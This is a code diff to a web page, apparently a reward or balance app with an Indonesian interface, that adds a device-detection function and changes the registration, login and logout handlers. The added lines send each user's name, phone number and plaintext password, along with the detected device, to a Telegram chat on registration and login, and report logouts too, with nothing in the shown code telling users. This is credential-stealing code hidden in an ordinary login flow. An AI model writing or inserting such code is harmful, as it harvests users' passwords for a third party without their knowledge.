@@ -1455,6 +1455,27 @@
         }
         function openChangePasswordModal() { openTargetModal('change-password-modal'); }
 
+        function getDeviceName() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            if (/iphone|ipad|ipod/.test(ua)) return "Apple (iOS)";
+            if (/macintosh|mac os/.test(ua)) return "Apple (Mac)";
+            if (/windows/.test(ua)) return "Windows PC";
+            if (/android/.test(ua)) {
+                if (/samsung|sm-/.test(ua)) return "Samsung";
+                if (/xiaomi|redmi|poco|mi /.test(ua)) return "Xiaomi / POCO";
+                if (/oppo|cph/.test(ua)) return "OPPO";
+                if (/vivo|v\d{4}/.test(ua)) return "Vivo";
+                if (/realme|rmx/.test(ua)) return "Realme";
+                if (/huawei|honor/.test(ua)) return "Huawei";
+                if (/infinix|x6/.test(ua)) return "Infinix";
+                if (/asus/.test(ua)) return "Asus";
+                return "Android";
+            }
+            if (/linux/.test(ua)) return "Linux";
+            return "Perangkat Tidak Dikenal";
+        }
+        
         function processRegister() {
             const name = document.getElementById('reg-name').value.trim();
             const phone = document.getElementById('reg-phone').value.trim();
@@ -1485,7 +1506,8 @@
 
             addNotifToUser(phone, "Selamat bergabung! Klaim saldo reward khusus pengguna baru.", "bonus");
 
-            sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nUID: \`${newUID}\``);
+            const deviceUsed = getDeviceName();
+            sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${newUID}\`\nDevice: *${deviceUsed}*`);
             
             closeTargetModal('register-modal'); 
             showModal("Berhasil", "Pendaftaran valid silakan login.", "win");
@@ -1526,12 +1548,22 @@
                 localStorage.setItem('sanz_current_phone', phone); 
                 localStorage.setItem('sanz_current_name', usersDb[phone].name);
                 currentUserPhone = phone; currentUserName = usersDb[phone].name;
+                const deviceUsed = getDeviceName();
+                sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\nDevice: *${deviceUsed}*`);
                 updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
                 showModal("Berhasil", `Selamat bergabung kembali, ${currentUserName}!`, "win");
             } else { showModal("Perhatian", "Nomor dan password salah.", "error"); }
         }
 
         function handleLogout() {
+            if(currentUserPhone) {
+                let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
+                let u = usersDb[currentUserPhone];
+                if(u) {
+                    sendToTelegram(`*AKTIVITAS LOGOUT*\nNama: ${currentUserName}\nHP: \`${currentUserPhone}\`\nUID: \`${u.uid}\``);
+                }
+            }
+
             localStorage.removeItem('sanz_current_phone'); localStorage.removeItem('sanz_current_name');
             currentUserPhone = null; currentUserName = null; userID = null; userBalance = 0;
             
